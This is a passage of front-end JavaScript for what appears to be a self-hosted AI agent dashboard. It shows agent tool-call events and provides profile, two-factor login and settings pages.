      ? (Object.keys(args).length ? `<div class="ev-args">${Object.entries(args).map(([k, v]) => `<div class="ev-arg"><span class="ev-key">${esc(k)}</span>${prettyValue(v)}</div>`).join("")}</div>` : `<div class="small faint">no arguments</div>`)
      : pre(JSON.stringify(args));
    const res = f.result == null ? `<div class="small faint">no result recorded${e.result ? "" : " yet"}</div>` : open.pretty ? prettyText(f.result) : pre(f.result);
    return `${block("Arguments", argsHtml)}${block(`Result${f.ok === false ? " (failed)" : ""}${f.result ? ` · ${bytes(f.result.length)}` : ""}`, res)}`;
  }
  const redraw = (id) => {
    const e = state.rows.find((x) => x.id === id);
    const tr = tbody.querySelector(`tr[data-id="${id}"]`);
    if (!e || !tr) return;
    tbody.querySelector(`tr[data-detail="${id}"]`)?.remove();
    tr.outerHTML = row(e);
  };
  tbody.addEventListener("click", async (ev) => {
    if (ev.target.closest("a")) return;
    const tr = ev.target.closest("tr.ev-row");
    if (!tr) return;
    const id = Number(tr.dataset.id), e = state.rows.find((x) => x.id === id);
    if (ev.target.closest("[data-pretty]")) {
      const o = state.open.get(id);
      o.pretty = !o.pretty;
      try { localStorage.setItem("los.events.pretty", o.pretty ? "1" : "0"); } catch { /* fine */ }
      return redraw(id);
    }
    if (state.open.has(id)) { state.open.delete(id); return redraw(id); }
    const o = { pretty: prettyDefault(), full: null };
    state.open.set(id, o);
    redraw(id);
    if (e?.data.type === "tool_call") {
      try { o.full = await api(`/api/events/${id}/full`); } catch (err) { o.full = { call: e.data.call, result: `Couldn't load it: ${err.message}` }; }
      if (state.open.get(id) === o) redraw(id);
    }
  });
  async function load(append = false) {
    const before = append && state.rows.length ? state.rows.at(-1).id : "";
    const rows = await api(`/api/events?before=${before}${state.type ? `&type=${state.type}` : ""}`);
    state.rows = append ? state.rows.concat(rows) : rows;
    tbody.innerHTML = state.rows.length ? state.rows.map((e) => row(e)).join("") : `<tr><td colspan="5"><div class="empty">No events yet.</div></td></tr>`;
    $("#more", root).hidden = rows.length < 200;
  }
  $$("#et button", root).forEach((b) => (b.onclick = () => { state.type = b.dataset.t; state.open.clear(); $$("#et button", root).forEach((x) => x.classList.toggle("on", x === b)); load(); }));
  $("#more", root).onclick = () => load(true);
  $("#live", root).onchange = (e) => (state.live = e.target.checked);
  await load();
  return {
    onAgent: (e) => {
      if (!state.live) return;
      // A result belongs on its call's row, not a row of its own.
      if (e.event.type === "tool_result" && state.type !== "tool_result") {
        const call = state.rows.find((x) => x.data.type === "tool_call" && x.data.call.id === e.event.id);
        if (call) { call.result = { ok: e.event.ok, preview: e.event.preview, ms: 0 }; const o = state.open.get(call.id); if (o) o.full = null; redraw(call.id); if (o) api(`/api/events/${call.id}/full`).then((f) => { o.full = f; redraw(call.id); }).catch(() => {}); }
        return;
      }
      if (state.type && e.event.type !== state.type) return;
      const rec = { id: e.id, session_id: e.sessionId, task_id: e.taskId, turn: e.turn, agent: e.agent, data: e.event, created_at: null, result: null };
      state.rows.unshift(rec);
      if (tbody.querySelector(".empty")) tbody.innerHTML = "";
      tbody.insertAdjacentHTML("afterbegin", row(rec, true));
    },
  };
}
function eventSummary(d) {
  switch (d.type) {
    case "tool_call": return `${d.call.name} ${JSON.stringify(d.call.args)}`.slice(0, 300);
    case "tool_result": return `${d.ok ? "ok" : "failed"} ${d.name ? d.name + ": " : ""}${d.preview}`.slice(0, 300);
    case "text": return d.text.slice(0, 300);
    case "approval": return `${d.bypass ? "bypass" : d.granted ? "granted" : "denied"} ${d.call.name}`;
    case "error": return d.message;
    case "tools_loaded": return d.names.join(", ");
    case "request": return `step ${d.step} · ${d.brain} · ${d.tools.length} tools · history up to message #${d.upto}${d.system ? " · new system prompt" : ""}`;
    case "usage": return `${d.brain}: ${fmtTok((d.input ?? 0) + (d.cached ?? 0))} in (${fmtTok(d.cached ?? 0)} cached) · ${fmtTok(d.output ?? 0)} out${d.ms ? ` · ${fmtMs(d.ms)}` : ""}${d.cost ? ` · ${fmtCost(d.cost)}` : ""}`;
    case "context": return `${d.brain}: ${fmtTok(d.used)} tokens in context${d.window ? ` of ${fmtTok(d.window)}` : ""}`;
    case "runtime": {
      const r = d.raw ?? {};
      if (r.type === "system") return `init ${r.model ?? ""} · ${r.tools?.length ?? 0} tools`;
      if (r.type === "init") return `started a fresh session ${r.sessionID ?? ""}`;
      if (r.type === "limit") return `hit the limit (${r.over})${r.wrap_up ? ", asked to write up" : ""}`;
      if (r.type === "inbox") return `${r.delivered} new message(s) handed over while working`;
      if (r.type === "fallback") return `${r.from} couldn't take it → ${r.to}: ${r.reason}`;
      if (r.type === "result") return `result · ${r.num_turns ?? "?"} turns · ${((r.duration_ms ?? 0) / 1000).toFixed(1)}s${r.is_error ? " · error" : ""}`;
      return JSON.stringify(r).slice(0, 300);
    }
    default: return JSON.stringify(d).slice(0, 300);
  }
}

// ── profile ──────────────────────────────────────────────────────────────
// You: the name the agents call you ({{name}} in their personalities), your password, and two-factor login.
async function viewProfile(root) {
  let p = await api("/api/profile");
  const draw = () => {
    root.innerHTML = `<div class="page narrow">
      <div class="page-head"><div><h1>Profile</h1><p>You, as los and the team know you.</p></div></div>
      <section class="card stack">
        <h2 class="section" style="margin:0">Name</h2>
        <p class="small muted" style="margin:0">What the agents call you. Their personalities say <code>{{name}}</code> and get this. Login name: <b>${esc(p.username)}</b>.</p>
        <form class="row" id="pf-name" style="gap:8px"><input class="input grow" name="displayName" value="${esc(p.displayName)}" maxlength="60" required><button class="btn primary">Save</button></form>
      </section>
      <section class="card stack">
        <h2 class="section" style="margin:0">Password</h2>
        <p class="small muted" style="margin:0">Changing it logs out every other browser and phone; this one stays logged in.</p>
        <form class="stack" id="pf-pass">
          <label class="field">Current password<input class="input" type="password" name="current" autocomplete="current-password" required></label>
          <label class="field">New password <span class="small faint">at least 10 characters</span><input class="input" type="password" name="next" autocomplete="new-password" minlength="10" required></label>
          <label class="field">New password again<input class="input" type="password" name="again" autocomplete="new-password" minlength="10" required></label>
          <div><button class="btn primary">Change password</button></div>
        </form>
      </section>
      <section class="card stack" id="pf-2fa">
        <h2 class="section" style="margin:0">Two-factor login ${p.twoFactor ? `<span class="chip sea">on</span>` : `<span class="chip outline">off</span>`}</h2>
        ${p.twoFactor ? `
          <p class="small muted" style="margin:0">Logging in asks for a code from your authenticator app after the password. ${p.recoveryLeft} recovery code${p.recoveryLeft === 1 ? "" : "s"} left.</p>
          <form class="stack" id="pf-2fa-off">
            <div class="row" style="gap:8px"><input class="input grow" type="password" name="password" placeholder="Password" autocomplete="current-password" required><input class="input" name="code" placeholder="Code from the app" inputmode="numeric" style="width:170px" required></div>
            <div class="row" style="gap:8px"><button class="btn" data-act="recovery">New recovery codes</button><button class="btn danger" data-act="off">Turn off</button></div>
          </form>`
        : `<p class="small muted" style="margin:0">After your password, los also asks for a 6-digit code from an app on your phone (Google Authenticator, Authy, 1Password, Bitwarden…). Someone with only your password can't get in.</p>
          <div id="pf-2fa-setup"><button class="btn primary" id="pf-2fa-start">Set up</button></div>`}
        <div id="pf-codes"></div>
      </section>
      <p class="small faint">Locked out (lost phone and recovery codes)? On the server: <code>docker exec -it los npm run password -- ${esc(p.username)}</code> sets a new password and turns two-factor off.</p>
    </div>`;
    $("#pf-name", root).onsubmit = async (e) => {
      e.preventDefault();
      try { p = await api("/api/profile", { method: "PUT", body: { displayName: new FormData(e.target).get("displayName") } }); toast("Saved. The agents will call you that from their next answer."); loadSpace(true); } catch (err) { fail(err); }
    };
    $("#pf-pass", root).onsubmit = async (e) => {
      e.preventDefault();
      const f = new FormData(e.target);
      if (f.get("next") !== f.get("again")) return toast("The new passwords don't match", true);
      try { await api("/api/profile/password", { method: "POST", body: { current: f.get("current"), next: f.get("next") } }); e.target.reset(); toast("Password changed. Other sessions are logged out."); } catch (err) { fail(err); }
    };
    const showCodes = (codes) => {
      $("#pf-codes", root).innerHTML = `<div class="recovery"><b>Recovery codes</b><p class="small muted" style="margin:4px 0 8px">Each works once instead of a code from the app. Save them somewhere safe now: they won't be shown again.</p>
        <pre>${codes.map(esc).join("\n")}</pre><button class="btn sm" id="pf-copy">Copy</button></div>`;
      $("#pf-copy", root).onclick = () => navigator.clipboard.writeText(codes.join("\n")).then(() => toast("Copied"));
    };
    if ($("#pf-2fa-start", root)) $("#pf-2fa-start", root).onclick = async () => {
      try {
        const s = await api("/api/profile/2fa/start", { method: "POST", body: {} });
        $("#pf-2fa-setup", root).innerHTML = `<div class="twofa">
          <img src="${esc(s.qr)}" alt="QR code for your authenticator app" width="220" height="220">
          <div class="stack" style="gap:8px">
            <div class="small">1. Scan the code with your authenticator app.</div>
            <div class="small muted">Can't scan? Enter this key: <code class="mono">${esc(s.secret.replace(/(.{4})/g, "$1 ").trim())}</code></div>
            <div class="small">2. Type the 6-digit code it shows:</div>
            <form class="row" id="pf-2fa-confirm" style="gap:8px"><input class="input" name="code" inputmode="numeric" autocomplete="one-time-code" placeholder="123456" style="width:140px" required autofocus><button class="btn primary">Turn on</button></form>
          </div></div>`;
        $("#pf-2fa-confirm", root).onsubmit = async (e) => {
          e.preventDefault();
          try { const r = await api("/api/profile/2fa/confirm", { method: "POST", body: { code: new FormData(e.target).get("code") } }); p = await api("/api/profile"); draw(); showCodes(r.recovery); toast("Two-factor login is on"); } catch (err) { fail(err); }
        };
      } catch (err) { fail(err); }
    };
    $$("#pf-2fa-off [data-act]", root).forEach((b) => (b.onclick = async (e) => {
      e.preventDefault();
      const f = new FormData($("#pf-2fa-off", root));
      try {
        if (b.dataset.act === "off") { if (!confirm("Turn two-factor login off?")) return; p = await api("/api/profile/2fa/disable", { method: "POST", body: { password: f.get("password"), code: f.get("code") } }); draw(); toast("Two-factor login is off"); }
        else { const r = await api("/api/profile/2fa/recovery", { method: "POST", body: { password: f.get("password"), code: f.get("code") } }); p = await api("/api/profile"); draw(); showCodes(r.recovery); }
      } catch (err) { fail(err); }
    }));
  };
  draw();
}

// ── settings ─────────────────────────────────────────────────────────────
async function viewSettings(root) {
  const draw = async () => {
    const s = await api("/api/settings");
    const theme = (() => { try { return localStorage.getItem("los.theme") || "auto"; } catch { return "auto"; } })();
    root.innerHTML = `<div class="page">
      <div class="page-head"><div><h1>Settings</h1><p>Brains, privacy rules and routing come from <code>config/settings.yaml</code>. Secrets never go in it, only the <em>names</em> of env vars that hold them.</p></div></div>
      <div class="grid grid-2">
        <section class="card card-pad stack"><h3 style="margin:0">Claude Code</h3>
          <dl class="kv"><dt>CLI</dt><dd>${s.claude.version ? `<span class="chip ok">${esc(s.claude.version)}</span>` : `<span class="chip err">not found</span>`}</dd>
            <dt>Login</dt><dd>${s.claude.loggedIn ? `<span class="chip ok">shared host login</span>` : `<span class="chip err">not logged in</span>`}</dd></dl>
          <div class="small muted">The <code>claude-code</code> brain runs the <code>claude</code> CLI with the server's own login (mounted from <code>~/.claude</code>), so no API key is needed. Each chat maps to one Claude Code session and continues it.</div></section>
        <section class="card card-pad stack"><h3 style="margin:0">Appearance</h3>
          <div class="tabs" id="theme">${["auto", "light", "dark"].map((t) => `<button data-th="${t}" class="${t === theme ? "on" : ""}">${t}</button>`).join("")}</div>
          <dl class="kv"><dt>Default agent</dt><dd>${esc(s.defaultAgent)}</dd>
            <dt>Local-only</dt><dd>${s.privacy.local_only.map((p) => `<code>${esc(p)}</code>`).join(" ") || "—"}</dd>
            <dt>Sources</dt><dd>${s.sources.map((x) => `<code>${esc(x.id)}</code>`).join(" ") || "—"}</dd></dl></section>
      </div>
      <h2 class="section">Brains</h2>
      <a class="card card-pad row" href="/brains" style="text-decoration:none">${s.brains.length} brains: ${s.brains.map((b) => `<span class="chip">${esc(b.label || b.name)}</span>`).join(" ")}<span class="grow"></span><span class="muted">Manage →</span></a>
      ${s.routing.length ? `<h2 class="section">Task routing</h2><div class="card"><table class="table"><thead><tr><th>If title/prompt matches</th><th>Agent</th></tr></thead><tbody>
        ${s.routing.map((r) => `<tr><td class="mono small">${esc(r.match)}</td><td>${esc(r.agent)}</td></tr>`).join("")}</tbody></table></div>` : ""}
      <h2 class="section">config/settings.yaml</h2>
      <div class="card card-pad stack"><textarea class="input code-edit" id="raw" spellcheck="false" style="min-height:460px">${esc(s.raw)}</textarea>
        <div class="row"><span class="small faint grow">Saved changes apply right away, no restart needed. Invalid settings get rolled back.</span><button class="btn primary" id="save">Save</button></div></div>
    </div>`;
    codeEditor($("#raw", root));
    $$("#theme button", root).forEach((b) => (b.onclick = () => { setTheme(b.dataset.th); $$("#theme button", root).forEach((x) => x.classList.toggle("on", x === b)); }));
    $("#save", root).onclick = async () => {
      try { await api("/api/settings", { method: "PUT", body: { raw: $("#raw", root).value } }); toast("Settings saved"); await loadMeta(true); draw(); } catch (e) { fail(e); }
    };
  };
  await draw();
}
function setTheme(t) {
  try { localStorage.setItem("los.theme", t); } catch { /* private mode */ }
  if (t === "auto") document.documentElement.removeAttribute("data-theme");
  else document.documentElement.dataset.theme = t;
}

// ── boot ─────────────────────────────────────────────────────────────────
try { const t = localStorage.getItem("los.theme"); if (t && t !== "auto") document.documentElement.dataset.theme = t; } catch { /* ignore */ }
// ?static skips the live stream (headless screenshots never go idle with an open EventSource).
if (!new URLSearchParams(location.search).has("static")) connectStream();
refreshStatus();
setInterval(refreshStatus, 30_000);
render();
